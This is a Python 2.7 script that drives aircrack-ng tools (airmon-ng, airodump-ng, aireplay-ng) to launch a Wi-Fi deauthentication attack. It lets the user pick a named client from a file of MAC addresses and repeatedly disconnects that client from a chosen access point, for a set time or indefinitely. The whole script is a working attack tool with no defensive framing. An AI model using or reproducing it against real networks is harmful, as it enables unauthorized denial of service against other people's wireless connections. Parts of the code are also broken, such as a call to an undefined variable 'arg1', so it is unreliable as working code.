# Python 2.7 compatible, Linux compatible, ensure wireless interface is both capable of packet injection and is assigned to wlan0

import os
import sys
import time

table = {}
test = False

def startup():
    print("")
    print("Ensure the network interface is not in monitor mode. ")
    choice = raw_input("Continue? Y/N: ")

    while choice.lower() != "y" and choice.lower() != "n":
        print("Invalid input. ")
        choice = raw_input("Continue? Y/N: ")
    if choice.lower() == "n":
        sys.exit()

    os.system("xterm -e airmon-ng start wlan0")


def main():
    table = {}
    test = False
    BSSID = "0:0:0:0:0"
    file_name = "addresses.txt"

    f = open(file_name,"r")
    for line in f:
        if line.rstrip():
            line = line.rstrip()
            line = line.replace(" ","")
            line = line.split("=")
            key = line[0]
            data = line[1]
            if key != "BSSID":
                table[key] = data
            else:
                BSSID = data

    print("")
    for i in table.keys():
        print(i)
    print("")

    target = raw_input("Please select a target from the above list. ")
    if target not in table.keys():
        print("Invalid response. ")
        target = raw_input("Please select again. ")
    print("")
   
    timer = raw_input("Enter timeout length (seconds), -1 for infinite: ")
    if timer == "-1":
        print("")
        #print("Initializing...\n")
        print("Targeting "+ target + " at address " + table[target])
        print("Press ctlr+c to quit. ")
        os.system(arg1)
        time.sleep(1)
        os.system("xterm -e aireplay-ng -0 0 -a " + BSSID + " -c " + table[target] + " -x 15 wlan0mon")
    else:
        while test != True:
            try:
                timer = int(timer)
                a = timer + 1
                test = True
            except:
                print("\nInvalid input. \n")
                timer = raw_input("Enter timeout length (seconds), -1 for infinite: ")
        timer = str(timer)
        print("")
        #print("Initializing...\n")
        print("Targeting " + target+ " at address " + table[target] + " for "+str(timer) + " seconds. ")
        os.system("xterm -e timeout 5 airodump-ng -d " + BSSID + " -c 11 wlan0mon")
        time.sleep(1)
        os.system("xterm -e timeout " +timer+ " aireplay-ng -0 0 -a " + BSSID + " -c " +table[target]+ " -x 15 wlan0mon")
        os.system("xterm -e airmon-ng stop wlan0mon")
        time.sleep(1)
        print("Attack complete. \n")

startup()
main()
